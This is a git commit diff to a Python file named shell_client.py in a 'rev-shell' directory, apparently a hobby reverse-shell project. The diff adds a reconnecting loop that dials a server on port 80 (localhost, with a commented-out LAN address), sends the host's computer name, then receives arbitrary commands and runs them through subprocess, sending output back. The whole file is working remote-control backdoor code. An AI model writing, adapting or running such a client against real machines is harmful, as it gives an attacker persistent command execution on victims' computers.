2c9498460f99982a91b41b1ac5fd4ff979a864d2
mrlongsword <60816759+mrlongsword@users.noreply.github.com>
2022-06-14 03:28:54 +0800

    Update shell_client.py

--- rev-shell/shell_client.py
+++ rev-shell/shell_client.py
@@ -2,43 +2,59 @@
 import socket
 import subprocess
 import os
-server = "127.0.0.1"
+from time import sleep
+server = "127.0.0.1"#"192.168.210.140"
 BUFFER = 1024*128
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connected = False
 shell = True
 command = ""
 output = ""
-while not connected:
-    try:
-        c = s.connect((server,80))
-        connected = True
-        print("Success!")
-    except:
-        print("server offline")
-    
-
-while shell:
-    # receive the command from the server
-    command = s.recv(BUFFER).decode()
-    splited_command = command.split()
-    print(splited_command)
-    if command == "pwd":
-        output = os.getcwd()
-    elif command == "exit":
-        
-        break
-    elif splited_command[0] == "cd":
+def phoneHome():
+    global connected,server,s
+    while not connected:
         try:
-            os.chdir(os.getcwd().join(splited_command[1:]))
-            output = os.getcwd()
-        except FileNotFoundError as e:
-            output = str(e)
-            
-    else:
-        output = subprocess.getoutput(command)
-    print("output:\n",output)
-    output +='\0'
-    s.send(output.encode())
+            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.connect((server,80))
+            connected = True
+            print("Success!")
+            s.send(os.getenv("COMPUTERNAME").encode())
+        except:
+            print("server offline")
+    
+def rce():
+    global shell,command,output,connected
+    while shell:
+        # receive the command from the server
+        try:
+            command = s.recv(BUFFER).decode()
+            splited_command = command.split()
+            print(splited_command)
+        except:
+            print("network error")
+            connected = False
+            break
 
-s.close()
+        if command == "pwd":
+            output = os.getcwd()
+        elif command == "exit":
+            connected = False
+            break
+        elif splited_command[0] == "cd":
+            try:
+                os.chdir(os.getcwd().join(splited_command[1:]))
+                output = os.getcwd()
+            except FileNotFoundError as e:
+                output = str(e)
+                
+        else:
+            output = subprocess.getoutput(command)
+        print("output:\n",output)
+        output +='\0'
+        s.send(output.encode())
+
+    
+while True:
+    phoneHome()
+    rce()
+    
